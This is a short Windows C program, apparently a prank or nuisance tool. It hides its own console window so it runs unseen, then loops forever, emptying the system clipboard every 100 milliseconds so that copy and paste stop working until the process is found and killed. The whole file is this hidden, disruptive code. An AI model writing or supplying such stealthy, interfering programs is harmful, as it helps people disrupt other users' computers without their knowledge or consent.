#include<Windows.h>
void main() {
	//Hides the console
	HWND console;
	AllocConsole();
	console = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(console, 0);
	//Repeatedly empties the clipboard
	while (1) {
		OpenClipboard(0);
		EmptyClipboard();
		CloseClipboard();
		Sleep(100);
	}
}